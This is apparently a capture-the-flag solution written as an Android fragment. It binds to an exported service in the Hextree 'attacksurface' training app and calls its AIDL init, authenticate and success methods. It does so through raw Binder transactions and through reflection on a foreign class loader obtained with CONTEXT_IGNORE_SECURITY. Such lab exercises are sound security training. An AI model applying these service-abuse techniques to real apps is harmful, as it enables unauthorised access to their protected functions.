package com.appdev.intentattacks;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

import java.lang.reflect.Method;
public class Flag29Fragment extends Fragment {
    private static final String TAG = "Flag29Fragment";

    private IBinder aidlBinder = null;
    private IBinder classLoaderBinder = null;
    private boolean aidlBound = false;
    private boolean classLoaderBound = false;

    // === AIDL ServiceConnection ===
    private final ServiceConnection aidlConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            aidlBinder = service;
            aidlBound = true;
            Toast.makeText(getContext(), "AIDL service connected\nClick again to proceed", Toast.LENGTH_SHORT).show();
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            aidlBinder = null;
            aidlBound = false;
        }
    };

    // === ClassLoader ServiceConnection ===
    private final ServiceConnection classLoaderConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            classLoaderBinder = service;
            classLoaderBound = true;
            Toast.makeText(getContext(), "ClassLoader service connected\nClick again to proceed", Toast.LENGTH_SHORT).show();
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            classLoaderBinder = null;
            classLoaderBound = false;
        }
    };

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_flag29, container, false);

        Button aidlButton = view.findViewById(R.id.btnLaunchFlag29AIDL);
        Button classLoaderButton = view.findViewById(R.id.btnLaunchFlag29ClassLoader);

        aidlButton.setOnClickListener(v -> {
            if (!aidlBound) {
                bindAidlService();
            } else {
                try {
                    String token = callInit();
                    callAuthenticate(token);
                    callSuccess();
                } catch (RemoteException e) {
                    Log.e(TAG, "Remote call failed", e);
                    Toast.makeText(getContext(), "Remote AIDL call failed", Toast.LENGTH_SHORT).show();
                }
            }
        });

        classLoaderButton.setOnClickListener(v -> {
            if (!classLoaderBound) {
                bindClassLoaderService();
            } else {
                try {
                    callViaClassLoader();
                } catch (Exception e) {
                    Log.e(TAG, "ClassLoader call failed", e);
                    Toast.makeText(getContext(), "ClassLoader call failed: " + e.getMessage(), Toast.LENGTH_LONG).show();
                }
            }
        });

        return view;
    }

    // === BEGIN ===
    // === AIDL Binder methods ===

    private void bindAidlService() {
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.services.Flag29Service"
        ));
        requireContext().bindService(intent, aidlConnection, Context.BIND_AUTO_CREATE);
    }

    private String callInit() throws RemoteException {
        Parcel in = Parcel.obtain();
        Parcel out = Parcel.obtain();
        try {
            in.writeInterfaceToken("io.hextree.attacksurface.services.IFlag29Interface");
            aidlBinder.transact(1, in, out, 0);
            out.readException();
            return out.readString();
        } finally {
            out.recycle();
            in.recycle();
        }
    }

    private void callAuthenticate(String token) throws RemoteException {
        Parcel in = Parcel.obtain();
        Parcel out = Parcel.obtain();
        try {
            in.writeInterfaceToken("io.hextree.attacksurface.services.IFlag29Interface");
            in.writeString(token);
            aidlBinder.transact(2, in, out, 0);
            out.readException();
        } finally {
            out.recycle();
            in.recycle();
        }
    }

    private void callSuccess() throws RemoteException {
        Parcel in = Parcel.obtain();
        Parcel out = Parcel.obtain();
        try {
            in.writeInterfaceToken("io.hextree.attacksurface.services.IFlag29Interface");
            aidlBinder.transact(3, in, out, 0);
            out.readException();
        } finally {
            out.recycle();
            in.recycle();
        }
    }

    // === END ===
    // === AIDL Binder methods ===

    // === BEGIN ===
    // === ClassLoader-based method ===
    private void bindClassLoaderService() {
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.services.Flag29Service"
        ));
        requireContext().bindService(intent, classLoaderConnection, Context.BIND_AUTO_CREATE);
    }

    private void callViaClassLoader() throws Exception {
        ClassLoader classLoader = getForeignClassLoader(requireContext(), "io.hextree.attacksurface");
        Class<?> iface = classLoader.loadClass("io.hextree.attacksurface.services.IFlag29Interface");

        Class<?> stubClass = null;
        for (Class<?> inner : iface.getDeclaredClasses()) {
            if (inner.getSimpleName().equals("Stub")) {
                stubClass = inner;
                break;
            }
        }

        if (stubClass == null) throw new ClassNotFoundException("Stub class not found");

        Method asInterface = stubClass.getMethod("asInterface", IBinder.class);
        Object remote = asInterface.invoke(null, classLoaderBinder);

        Method init = iface.getMethod("init");
        String token = (String) init.invoke(remote);

        Method auth = iface.getMethod("authenticate", String.class);
        auth.invoke(remote, token);

        Method success = iface.getMethod("success");
        success.invoke(remote);

        Toast.makeText(getContext(), "ClassLoader method succeeded", Toast.LENGTH_SHORT).show();
    }

    private ClassLoader getForeignClassLoader(Context context, String packageName) throws Exception {
        Context foreignContext = context.createPackageContext(
                packageName,
                Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY
        );
        return foreignContext.getClassLoader();
    }

    // === END ===
    // === ClassLoader-based method ===

    @Override
    public void onDestroyView() {
        super.onDestroyView();
        if (aidlBound) {
            requireActivity().unbindService(aidlConnection);
            aidlBound = false;
        }
        if (classLoaderBound) {
            requireActivity().unbindService(classLoaderConnection);
            classLoaderBound = false;
        }
    }
}